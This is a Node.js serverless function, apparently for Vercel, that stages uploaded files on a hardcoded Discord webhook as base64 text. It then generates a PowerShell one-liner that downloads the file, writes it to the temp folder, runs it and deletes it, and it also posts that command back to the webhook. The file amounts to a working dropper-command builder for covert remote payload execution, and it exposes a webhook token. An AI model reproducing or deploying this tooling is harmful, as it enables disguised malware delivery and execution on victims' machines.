const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

// Настройка лимитов для Vercel
module.exports.config = {
  api: {
    bodyParser: {
      sizeLimit: '4.5mb',
    },
  },
};

async function uploadToDiscord(base64Content, filename) {
  const encodedName = filename.replace(/\.[^/.]+$/, '') + '.b64';
  const boundary = '----Boundary' + Math.random().toString(36).substring(2);
  
  const payload = Buffer.concat([
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
    Buffer.from(base64Content, 'base64'),
    Buffer.from(`\r\n--${boundary}--\r\n`)
  ]);

  return new Promise((resolve, reject) => {
    const url = new URL(DISCORD_WEBHOOK);
    const req = https.request({
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': payload.length
      }
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (json.attachments?.[0]?.url) resolve(json.attachments[0].url);
          else reject(new Error('Discord error'));
        } catch (e) { reject(new Error('Invalid Discord response')); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

module.exports = async (req, res) => {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(200).json({ ok: true });

  try {
    const { files } = req.body;
    if (!files || !files[0]) return res.status(400).json({ success: false, error: 'No files' });

    const file = files[0];
    const uploadedUrl = await uploadToDiscord(file.content, file.filename);

    const cmd = `powershell -c "$t=\\"$env:TEMP\\${file.filename}\\";$u='${uploadedUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;

    // Текстовое уведомление в Discord (асинхронно)
    const wh = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
    wh.write(JSON.stringify({ content: `📁 **${file.filename}**\n\`\`\`powershell\n${cmd}\n\`\`\`` }));
    wh.end();

    return res.status(200).json({ success: true, command: cmd });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
};
